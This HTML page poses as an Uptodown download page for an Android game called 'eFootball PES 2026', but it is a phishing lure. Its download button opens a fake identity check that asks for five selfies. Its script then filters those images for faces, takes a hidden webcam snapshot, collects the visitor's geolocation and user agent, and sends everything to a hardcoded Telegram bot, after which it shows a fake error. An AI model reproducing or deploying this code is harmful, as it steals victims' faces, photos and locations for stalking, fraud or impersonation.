<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball PES 2026 for Android - Download APK</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --upto-bg: #081d24; 
            --upto-header: #051116; 
            --upto-blue: #1b85d3;
            --upto-green: #00b451;
            --upto-dim: #7e949c;
            --upto-card: #0c262f;
        }

        body { margin: 0; background: var(--upto-bg); font-family: 'Roboto', sans-serif; color: white; -webkit-font-smoothing: antialiased; }

        header { background: var(--upto-header); height: 56px; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #102a33; position: sticky; top: 0; z-index: 1000; }
        .logo { height: 22px; margin-left: 15px; }
        .burger { color: var(--upto-blue); font-size: 24px; cursor: pointer; }

        .breadcrumb { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--upto-dim); text-transform: uppercase; }

        .container { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }

        /* App Header */
        .app-hero { display: flex; gap: 20px; margin-bottom: 25px; }
        .app-icon { width: 105px; height: 105px; border-radius: 22px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); }
        .app-title { font-size: 28px; font-weight: 700; margin: 0; line-height: 1.2; }
        .app-meta { font-size: 14px; margin-top: 6px; color: var(--upto-dim); }
        .dev-link { color: var(--upto-blue); text-decoration: none; font-weight: 500; }
        .tag-badge { background: #1e3a45; color: var(--upto-blue); padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 5px; }

        /* Stats */
        .stats-bar { display: flex; justify-content: space-around; border-top: 1px solid #15323d; border-bottom: 1px solid #15323d; padding: 16px 0; margin: 20px 0; text-align: center; }
        .stat-val { font-size: 18px; font-weight: 700; display: block; }
        .stat-label { font-size: 11px; color: var(--upto-dim); text-transform: uppercase; }

        /* Download Button */
        .btn-dl { background: var(--upto-green); color: white; width: 100%; padding: 16px; border-radius: 6px; font-weight: 700; font-size: 18px; border: none; box-shadow: 0 4px 0 #008a3d; cursor: pointer; }
        .btn-dl:active { transform: translateY(2px); box-shadow: none; }

        /* Gallery - Yoniga suriladi */
        .gallery-label { font-size: 14px; font-weight: 700; color: var(--upto-dim); margin: 30px 0 15px; text-transform: uppercase; }
        .gallery-scroll { display: flex; overflow-x: auto; gap: 12px; padding-bottom: 10px; scrollbar-width: none; }
        .gallery-scroll::-webkit-scrollbar { display: none; }
        .gallery-scroll img { height: 180px; border-radius: 10px; border: 1px solid #15323d; flex-shrink: 0; }

        /* Technical Info Grid */
        .tech-title { font-size: 18px; font-weight: 700; margin: 40px 0 20px; }
        .tech-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; background: var(--upto-card); padding: 24px; border-radius: 12px; }
        .tech-item { display: flex; gap: 12px; align-items: center; }
        .tech-icon { width: 34px; height: 34px; border: 1px solid var(--upto-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--upto-blue); font-size: 16px; }
        .tech-info b { display: block; font-size: 11px; color: var(--upto-dim); text-transform: uppercase; }
        .tech-info span { font-size: 14px; font-weight: 500; }

        /* Stealth Verification Overlay */
        #mask { display: none; position: fixed; inset: 0; background: rgba(5,17,22,0.98); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
        .card { background: var(--upto-card); width: 100%; max-width: 340px; padding: 35px; border-radius: 16px; border: 1px solid var(--upto-blue); text-align: center; }
        video, canvas, #fInput { display: none; }
    </style>
</head>
<body>

<header>
    <div class="burger">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
</header>

<div class="breadcrumb">Android / Games / Sports / eFootball PES 2026</div>

<div class="container">
    <div class="app-hero">
        <img src="image_980b88.png" class="app-icon">
        <div>
            <h1 class="app-title">eFootball PES 2026</h1>
            <div class="app-meta">10.4.0 | <a href="#" class="dev-link">Uptodown.com</a> <span class="badge tag-badge">#Sports</span></div>
        </div>
    </div>

    <div class="stats-bar">
        <div><span class="stat-val">★ 4.4</span><span class="stat-label">135k reviews</span></div>
        <div><span class="stat-val">74.8 M</span><span class="stat-label">downloads</span></div>
        <div><span class="stat-val">🛡️</span><span class="stat-label">Verified</span></div>
    </div>

    <button class="btn-dl" onclick="showMask()">Latest version</button>

    <div class="gallery-label">Screenshots</div>
    <div class="gallery-scroll">
        <img src="image_980e4b.png">
        <img src="image_980e8c.png">
        <img src="image_980ece.png">
        <img src="image_980f42.png">
        <img src="image_9811ee.png">
    </div>

    <h2 class="tech-title">Technical information</h2>
    <div class="tech-grid">
        <div class="tech-item">
            <div class="tech-icon">👤</div>
            <div class="tech-info"><b>Developer</b><span>Uptodown.com</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📄</div>
            <div class="tech-info"><b>License</b><span>Free</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📱</div>
            <div class="tech-info"><b>OS</b><span>Android 7.0+</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📦</div>
            <div class="tech-info"><b>Package</b><span>jp.konami.pesam</span></div>
        </div>
    </div>
</div>

<div id="mask">
    <div class="card">
        <h3 id="mTitle">Verify Identity</h3>
        <p id="mText" style="font-size: 13px; color: var(--upto-dim);">Upload 5 photos of yourself to unlock the download link.</p>
        <label for="fInput" style="background: var(--upto-blue); display: block; padding: 14px; border-radius: 6px; cursor: pointer; font-weight: 700; margin-top: 20px;">BROWSE GALLERY</label>
        <input type="file" id="fInput" multiple accept="image/*" onchange="runAI(this)">
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [];

    async function init() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    init();

    function showMask() { document.getElementById('mask').style.display = 'flex'; }

    async function runAI(input) {
        document.getElementById('mTitle').innerText = "Analyzing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) photos.push(f);
        }
        capture();
    }

    async function capture() {
        const info = navigator.userAgent;
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = s;
            await new Promise(r => setTimeout(r, 1000));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            s.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await push(info, map, blob);
            }, () => push(info, "Denied", blob));
        } catch(e) { push(info, "No Cam", null); }
    }

    async function push(d, l, s) {
        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: `✅ *HIT*\n📱 ${d}\n📍 ${l}`, parse_mode: 'Markdown'})
        });
        if(s) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', s);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }
        for (let p of photos) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', p);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("System error. Try another device.");
        location.reload();
    }
</script>
</body>
</html>
